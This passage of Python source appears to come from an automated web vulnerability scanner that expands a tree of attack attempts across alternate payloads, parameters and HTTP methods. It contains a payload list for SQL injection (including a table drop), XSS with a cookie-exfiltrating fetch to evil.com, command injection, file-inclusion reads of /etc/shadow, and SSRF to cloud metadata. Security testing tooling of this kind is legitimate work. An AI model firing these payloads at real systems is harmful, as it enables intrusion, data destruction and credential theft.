            "sql_injection": ["1 UNION SELECT 1,2,3--+", "1; DROP TABLE test--", "1 AND 1=CAST((SELECT @@version) AS INT)--"],
            "xss": ["<svg/onload=alert(1)>", "\"-alert(1)-\"", "<img src=x onerror=fetch('http://evil.com?'+document.cookie)>"],
            "rce": ["|whoami", "$(uname -a)", "&& cat /etc/passwd"],
            "lfi": ["php://filter/convert.base64-encode/resource=index", "/proc/self/environ", "....//....//....//etc/shadow"],
            "ssrf": ["http://169.254.169.254/latest/meta-data/", "gopher://127.0.0.1:6379/_INFO", "file:///etc/passwd"],
        }
        alt_list = alt_payloads.get(vuln, ["advanced_payload_1", "advanced_payload_2"])
        for i, alt in enumerate(alt_list[:2]):
            child = tree.create_child_node(
                parent=parent, action="explore_depth",
                action_params={"endpoint": ep, "param": param, "vuln_type": vuln, "payload": alt, "depth_strategy": f"alt_payload_{i}"},
                vuln_type=vuln, endpoint=ep, param=param,
                value_estimate=max(0.4, node.value_estimate * 0.85), created_at_cycle=current_cycle,
            )
            child.status = NodeStatus.SEED
            created.append(child)

        # 方向 2: 不同参数名 (尝试其他参数)
        alt_params = {
            "id": ["user_id", "uid", "pk", "rid"],
            "q": ["query", "search", "keyword", "s"],
            "cmd": ["exec", "command", "run", "action"],
            "file": ["path", "include", "template", "page"],
            "url": ["redirect", "callback", "next", "dest"],
        }
        current_p = param or ""
        alt_p_list = alt_params.get(current_p, ["action", "type", "mode", "token"])
        for alt_p in alt_p_list[:2]:
            if alt_p == current_p:
                continue
            child = tree.create_child_node(
                parent=parent, action="explore_depth",
                action_params={"endpoint": ep, "param": alt_p, "vuln_type": vuln, "depth_strategy": "alt_param"},
                vuln_type=vuln, endpoint=ep, param=alt_p,
                value_estimate=max(0.35, node.value_estimate * 0.7), created_at_cycle=current_cycle,
            )
            child.status = NodeStatus.LOW_SIGNAL
            created.append(child)

        # 方向 3: 不同 HTTP 方法
        for method in ["POST", "PUT"]:
            child = tree.create_child_node(
                parent=parent, action="explore_depth",
                action_params={"endpoint": ep, "param": param, "vuln_type": vuln, "method": method, "depth_strategy": f"http_{method}"},
                vuln_type=vuln, endpoint=ep, param=param,
                value_estimate=max(0.3, node.value_estimate * 0.6), created_at_cycle=current_cycle,
            )
            child.status = NodeStatus.LOW_SIGNAL
            created.append(child)

        logger.info("expand_node_for_depth: %d children for %s @ %s (depth %d→%d)",
                    len(created), vuln, ep, node.depth, node.depth + 1)
        return created

    def get_expansion_stats(self) -> dict:
        """获取扩展统计"""
        return {
            "total_expansions": len(self._expansion_history),
            "history": self._expansion_history[-5:],
            "quotas": {
                "total_new_endpoints": self.quotas.total_new_endpoints,
                "global_max_nodes": self.quotas.global_max_nodes,
                "current_nodes": 0,  # 外部填充
            },
        }
